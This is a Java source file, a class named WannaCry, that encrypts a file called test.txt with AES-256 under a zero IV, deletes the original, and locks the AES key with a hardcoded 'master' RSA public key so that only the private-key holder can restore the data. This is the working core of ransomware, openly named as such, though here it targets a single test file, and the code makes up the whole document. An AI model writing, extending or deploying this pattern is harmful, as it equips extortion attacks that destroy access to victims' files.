import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class WannaCry {
    
    // Master RSA public key (Base64 encoded)
    private static final String MASTER_PUBLIC_KEY = 
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIw" +
        "nFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjuln" +
        "eQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT" +
        "+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbm" +
        "aouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6" +
        "Q6BYuQIDAQAB";
    
    public static void main(String[] args) throws Exception {
        try {
            // Generate a fresh 256-bit AES key
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey aesKey = keyGen.generateKey();
            
            // Encrypt test.txt with AES-256-CBC
            encryptFile("test.txt", "test.txt.cry", aesKey);
            
            // Delete original test.txt
            Files.delete(Paths.get("test.txt"));
            
            // Encrypt AES key with master RSA public key
            PublicKey masterPublicKey = decodePublicKey(MASTER_PUBLIC_KEY);
            byte[] encryptedAesKey = encryptAesKey(aesKey.getEncoded(), masterPublicKey);
            
            // Save encrypted AES key to aes.key
            try (FileOutputStream fos = new FileOutputStream("aes.key")) {
                fos.write(encryptedAesKey);
            }
            
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        }
    }
    
    /**
     * Encrypt file using AES-256-CBC with zero IV and PKCS5Padding
     */
    private static void encryptFile(String inputFile, String outputFile, SecretKey aesKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        
        // Create IV with 16 zero bytes
        byte[] iv = new byte[16];
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);
        
        // Read input file
        byte[] inputData = Files.readAllBytes(Paths.get(inputFile));
        
        // Encrypt data
        byte[] encryptedData = cipher.doFinal(inputData);
        
        // Write to output file
        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
            fos.write(encryptedData);
        }
    }
    
    /**
     * Encrypt AES key bytes with RSA public key
     */
    private static byte[] encryptAesKey(byte[] aesKeyBytes, PublicKey publicKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(aesKeyBytes);
    }
    
    /**
     * Decode Base64-encoded RSA public key
     */
    private static PublicKey decodePublicKey(String base64Key) throws Exception {
        byte[] decodedKey = Base64.getDecoder().decode(base64Key);
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(decodedKey);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePublic(keySpec);
    }
}
